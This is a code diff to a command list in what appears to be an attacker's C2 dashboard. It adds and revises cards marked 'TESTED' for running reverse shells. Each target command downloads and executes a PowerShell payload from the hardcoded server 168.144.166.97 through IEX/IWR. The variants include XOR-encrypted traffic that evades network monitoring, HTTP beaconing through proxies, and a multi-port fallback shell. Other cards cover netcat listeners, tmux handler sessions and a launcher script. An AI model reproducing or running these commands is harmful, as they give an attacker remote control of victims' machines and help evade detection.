@@ -4732,31 +4732,38 @@ const COMMANDS = [
   },
   {
     title: "[C2] Encrypted Shell - Port 6666",
-    desc: "TESTED: XOR-encrypted traffic. Basic obfuscation for network monitoring.",
-    code: "# VPS: python3 /opt/c2_encrypted.py\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_encrypted.ps1 -UseBasicParsing)",
+    desc: "TESTED: XOR-encrypted traffic. Obfuscates network monitoring.",
+    code: "# VPS: tmux attach -t c2_6666\n# Or start: python3 /opt/c2_enc_multi.py 6666\n\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_encrypted.ps1 -UseBasicParsing)",
     tags: ["ps", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "[C2] HTTP Beacon Shell - Port 8080",
-    desc: "HTTP-based beaconing. Works through proxies, more reliable.",
-    code: "# VPS: python3 /opt/c2_http.py\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_http.ps1 -UseBasicParsing)",
+    desc: "TESTED: HTTP beaconing. Works through proxies, polling-based.",
+    code: "# VPS: tmux attach -t c2_8080\n# Or start: python3 /opt/c2_http_multi.py 8080\n\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_http.ps1 -UseBasicParsing)",
     tags: ["ps", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "[C2] Multi-Port Resilient Shell",
-    desc: "Tries 4444,5555,443,80,8080 until one works. Maximum reliability.",
-    code: "# Start listeners on VPS:\ntmux new -d -s c2 'python3 /opt/c2_multi.py 4444'\nnc -lvnp 5555 &\n# Target:\nIEX(IWR http://168.144.166.97:8889/shell_multi.ps1 -UseBasicParsing)",
+    desc: "TESTED: Tries 4444,5555,443,80,8080 until one works. Max reliability.",
+    code: "# Target (auto-finds working port):\nIEX(IWR http://168.144.166.97:8889/shell_multi.ps1 -UseBasicParsing)",
     tags: ["ps", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
-    title: "[C2] Start All Listeners",
-    desc: "VPS command to start all C2 listeners at once.",
-    code: "# Main C2 (multi-session)\ntmux new -d -s c2 'python3 /opt/c2_multi.py 4444'\n\n# Simple TCP\nnc -lvnp 5555 &\n\n# Encrypted\ntmux new -d -s enc 'python3 /opt/c2_encrypted.py'\n\n# HTTP Beacon\ntmux new -d -s http 'python3 /opt/c2_http.py'\n\n# Payload server\ncd /opt && python3 -m http.server 8889 &",
-    tags: ["linux", "vps", "c2"],
+    title: "[C2] Start ALL Handlers (One Command)",
+    desc: "TESTED: Launches all C2 handlers in tmux sessions. Run this first!",
+    code: "/opt/c2_launcher.sh\n\n# Then connect to any:\n# tmux attach -t c2_4444  (main)\n# tmux attach -t c2_5555  (tcp)\n# tmux attach -t c2_6666  (encrypted)\n# tmux attach -t c2_8080  (http beacon)",
+    tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
+  },
+  {
+    title: "[C2] Handler Cheat Sheet",
+    desc: "Quick reference for all C2 handler ports and sessions.",
+    code: "# PORTS & HANDLERS:\n# 4444 = c2_multi.py    (tmux: c2_4444)\n# 5555 = c2_tcp.py      (tmux: c2_5555)\n# 6666 = c2_enc_multi.py (tmux: c2_6666)\n# 8080 = c2_http_multi.py (tmux: c2_8080)\n# 8889 = payload HTTP server\n\n# COMMANDS IN HANDLER:\n# sessions / agents - list all\n# use <n> - interact\n# bg - background\n# kill <n> - terminate",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00f0ff"
   },
 
   // ═══════════════════════════════════════════════════════════════
